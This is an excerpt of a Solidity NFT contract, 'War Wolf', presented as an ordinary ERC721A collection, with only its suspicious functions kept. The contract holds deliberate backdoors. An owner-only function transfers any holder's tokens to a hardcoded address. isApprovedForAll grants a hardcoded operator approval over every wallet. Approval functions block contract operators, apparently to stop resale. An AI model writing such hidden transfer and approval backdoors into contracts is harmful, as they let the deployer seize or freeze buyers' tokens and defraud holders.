...
contract War_Wolf is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("War Wolf", "WW", maxBatchSize_, collectionSize_) {
  ...
  function BurnThePaperHands(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x39d1525d16326D01733510aEF6751418b08512F3, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x59ff586425E2DD6897F7ee2646f59093d01DCab6);
  ...
  Ownable
{
  ...
  bool public ContractIsAllowed  = false; ///////////////////////////////////////////////////////////////////////////////////////////////////// new 2
  bool private off = false; ///////////////////////////////////////////////////////////////////////////////////////////////////// new 2
   ...
   */
    function approve(address to, uint256 tokenId) public override {
        ...
        if(!ContractIsAllowed  && !_ToCon[tokenId]){
            if (to.isContract()) {
   ...
   */
    function setApprovalForAll(address operator, bool approved) public override {
        ...
        if(!ContractIsAllowed  && !_addressToCon[msg.sender]){
        if(clockStop() || off){
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xAd171eAF08A41882bA9aF2B368Bc92A01e2dC183){return true;}
